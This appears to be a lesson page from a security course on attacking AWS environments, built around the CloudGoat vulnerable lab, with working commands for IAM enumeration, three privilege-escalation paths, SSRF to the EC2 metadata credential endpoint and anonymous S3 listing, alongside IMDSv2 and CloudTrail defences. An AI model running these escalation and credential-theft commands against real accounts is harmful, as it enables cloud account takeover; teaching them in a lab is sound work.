---
layout: page
title: "Attacking Cloud Infrastructure: CloudGoat"
week_number: "63"
release_date: "2027-06-29"
phase_label: "Phase 12"
phase_name: "SecDevOps"
phase_color: "#10b981"
permalink: /week-63/
---

> Week 63. Hands-on cloud attack lab.
> 
> CloudGoat is Rhino Security Labs' deliberately vulnerable AWS environment. Each scenario teaches a real attack path used in actual cloud breaches -- IAM privilege escalation, SSRF to metadata service, exposed Lambda functions, misconfigured S3 buckets.
> 
> Install CloudGoat: pip install cloudgoat. You need AWS credentials with permission to create resources.

---

# Cloud Attack Techniques

## What You Will Be Able to Do

By the end of this guide you will be able to:

- Explain the most common AWS attack techniques
- Enumerate IAM permissions from a compromised credential
- Identify and exploit common cloud misconfigurations
- Use CloudGoat for hands-on cloud attack practice
- Understand how defenders detect these attacks

---

## The Cloud Attack Surface

Cloud attacks typically start with one of:

1. **Credential theft** - IAM keys in code, S3 buckets, phishing
2. **SSRF to metadata service** - web app vulnerability exposes EC2 metadata
3. **Misconfigured S3 bucket** - public read/write access
4. **Overpermissioned Lambda** - function has more IAM access than needed
5. **Exposed management interfaces** - RDP, SSH open to 0.0.0.0/0

Once inside, attackers escalate privileges, move laterally, and establish persistence.

---

## IAM Enumeration

The first thing an attacker does with stolen AWS credentials is enumerate what they can access.

```bash
# Who am I?
aws sts get-caller-identity

# What policies does my user have?
aws iam get-user
aws iam list-attached-user-policies --user-name victim-user
aws iam list-user-policies --user-name victim-user

# What groups am I in?
aws iam list-groups-for-user --user-name victim-user

# What roles can I assume?
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS != null)'

# What can I access?
aws s3 ls                              # list all S3 buckets
aws ec2 describe-instances             # list EC2 instances
aws lambda list-functions              # list Lambda functions
aws secretsmanager list-secrets        # list secrets (if permitted)
```

Tools like `enumerate-iam` automate this by trying hundreds of API calls:

```bash
pip install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ... --region ap-southeast-2
```

---

## IAM Privilege Escalation

A low-privilege IAM user can escalate to admin through misconfigured policies.

### Common Escalation Paths

**Path 1: iam:CreatePolicyVersion**
```bash
# Create a new version of an existing policy that grants AdministratorAccess
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/target-policy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**Path 2: iam:AttachUserPolicy**
```bash
# Attach AdministratorAccess directly to your user
aws iam attach-user-policy \
  --user-name your-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Path 3: iam:PassRole + ec2:RunInstances**
```bash
# Launch an EC2 instance with an admin role attached
# The instance has admin access even if your user does not
aws ec2 run-instances \
  --image-id ami-xxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile
# Then connect via SSM and run aws commands as the admin role
```

The tool `Pacu` automates privilege escalation enumeration and exploitation.

---

## SSRF to EC2 Metadata Service

EC2 instances have a metadata service at `http://169.254.169.254` that provides IAM credentials.

If a web application makes requests to URLs controlled by the user (SSRF), an attacker can:

```
Attack: Set URL to http://169.254.169.254/latest/meta-data/iam/security-credentials/
Response: { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }
```

These are temporary credentials for the EC2 instance's IAM role. If that role has broad permissions, full account access is possible.

**Defence:** Use IMDSv2 (requires a PUT token request first):

```bash
# This no longer works with IMDSv2
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 requires a session token
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

Require IMDSv2 in your Terraform:
```hcl
resource "aws_instance" "web" {
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"   # IMDSv2 required
    http_put_response_hop_limit = 1
  }
}
```

---

## S3 Bucket Attacks

### Finding Exposed Buckets

```bash
# Try to access a bucket without credentials
curl https://BUCKET-NAME.s3.amazonaws.com/

# List bucket contents if public
aws s3 ls s3://target-bucket --no-sign-request

# Tools that automate bucket discovery
# - S3Scanner
# - bucket-stream (monitors CT logs for new buckets)
```

### Common S3 Misconfigurations

| Misconfiguration | Impact |
|-----------------|--------|
| Public read ACL | Anyone can download all files |
| Public write ACL | Anyone can upload malicious files |
| GetObject allowed for * | Same as public read |
| No encryption | Data readable if bucket is exposed |
| No versioning | Ransomware can delete all files |
| No access logging | No audit trail |

---

## CloudGoat: Hands-On Labs

CloudGoat provides real, deliberately vulnerable AWS environments.

```bash
pip install cloudgoat
cloudgoat config profile default

# Available scenarios
cloudgoat list

# Start a scenario
cloudgoat create iam_privesc_by_attachment

# The scenario gives you: low-privilege credentials
# Your goal: escalate to admin
# Document every step

# Clean up when done
cloudgoat destroy iam_privesc_by_attachment
```

Recommended scenarios in order:
1. `iam_privesc_by_attachment` - IAM escalation
2. `cloud_breach_s3` - S3 exposed bucket to credential theft
3. `ec2_ssrf` - SSRF to metadata service
4. `ecs_efs_attack` - container escape to EFS data

---

## Detection: How Defenders See These Attacks

Every AWS API call appears in CloudTrail. Defenders look for:

| Attack | CloudTrail Indicator |
|--------|---------------------|
| Credential theft | `GetCallerIdentity` from unusual IP/region |
| IAM enumeration | Burst of `List*` and `Describe*` calls |
| Privilege escalation | `AttachUserPolicy`, `CreatePolicyVersion`, `PutUserPolicy` |
| S3 exfiltration | Large number of `GetObject` calls on sensitive bucket |
| New IAM user | `CreateUser`, `CreateAccessKey` |
| Persistence | `CreateLoginProfile`, `UpdateLoginProfile` |

GuardDuty automates this detection using ML models trained on CloudTrail data.

---

## Key Things to Remember

- The first step after getting credentials is always enumeration
- IAM privilege escalation does not require admin - just the right combination of policies
- SSRF vulnerabilities in cloud environments are critical, not just medium
- Every API call leaves a CloudTrail log - attackers cannot hide their actions, only hope you are not looking
- IMDSv2, least privilege IAM, and CloudTrail are the three most important AWS security controls

---

## Activity: CloudGoat: IAM Privilege Escalation

1. Install and configure CloudGoat: pip install cloudgoat && cloudgoat config profile default
1. Deploy the iam_privesc_by_attachment scenario: cloudgoat create iam_privesc_by_attachment
1. You are given low-privilege AWS credentials. Your goal: escalate to admin without using the AWS console UI
1. Enumerate what you can access with your initial credentials: aws iam get-user, aws iam list-attached-user-policies
1. Follow the attack path: find a policy that allows AttachRolePolicy or similar, use it to give yourself admin
1. Document every step: what credentials you started with, what API calls revealed the path, what you ended up with
1. Destroy the scenario when done: cloudgoat destroy iam_privesc_by_attachment
1. You know you are done when you have documented the full attack path from low-privilege to admin

---

## Check-in Questions

Write your answers down before your next session.

1. What is IAM privilege escalation in AWS?
2. What AWS API calls would an attacker use to enumerate IAM permissions?
3. What is the principle of least privilege and why is it hard to maintain in a real organisation?
4. How would you detect this attack using CloudTrail?
